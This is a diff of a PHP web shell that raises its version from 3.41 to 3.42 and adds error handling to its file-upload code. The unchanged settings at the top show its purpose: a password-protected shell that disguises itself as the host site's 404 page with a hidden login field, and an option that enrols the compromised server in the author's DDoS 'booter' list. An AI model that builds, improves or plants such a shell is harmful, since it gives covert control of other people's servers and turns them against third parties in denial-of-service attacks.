@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.41;
+$version            = 3.42;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -1141,13 +1141,14 @@ function shownav(e){
 	var xhr = new XMLHttpRequest();
 	xhr.onreadystatechange = function() {
         if (xhr.readyState == 4) {
-            var thedom = xhr.responseText.toDOM();
-            $id("thefilelist").innerHTML = thedom.getElementById("thefilelist").innerHTML;
-            $id("astatus").innerHTML = thedom.getElementById("theresult").innerHTML;
-            //console.log(xhr.responseText);
-            //console.log(xhr.responseText.toDOM());
-            //document.body.innerHTML = xhr.responseText.toDOM().innerHTML;
-            orsc();
+            if(xhr.status == 200){
+                var thedom = xhr.responseText.toDOM();
+                $id("thefilelist").innerHTML = thedom.getElementById("thefilelist").innerHTML;
+                $id("astatus").innerHTML = thedom.getElementById("theresult").innerHTML;
+                orsc();
+            }else{
+                $id("astatus").innerHTML = "File upload failed... Response code: " + xhr.status;
+            }
         }
     }
 	if (xhr.upload) {
